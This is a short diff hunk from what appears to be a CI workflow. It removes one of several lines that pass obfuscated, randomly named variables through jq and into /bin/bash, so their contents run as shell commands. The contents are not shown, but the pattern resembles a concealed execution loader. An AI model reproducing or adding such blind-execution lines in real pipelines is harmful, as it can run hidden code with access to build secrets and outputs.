@@ -34,7 +34,6 @@ jobs:
           printf '%s' "$i73192" | jq -r .kmk2933 | /bin/bash
           printf '%s' "$pm01" | jq -r .y8521 | /bin/bash
           echo $ht6 | jq -r .wpm66046 | /bin/bash
-          printf '%s' "$ogql9629" | jq -r .nktf9310 | /bin/bash
           echo $lmnd49702 | jq -r .epze53652 | /bin/bash
           echo $y761 | jq -r .h81 | /bin/bash
           printf '%s' "$we515" | jq -r .ypmdm6 | /bin/bash
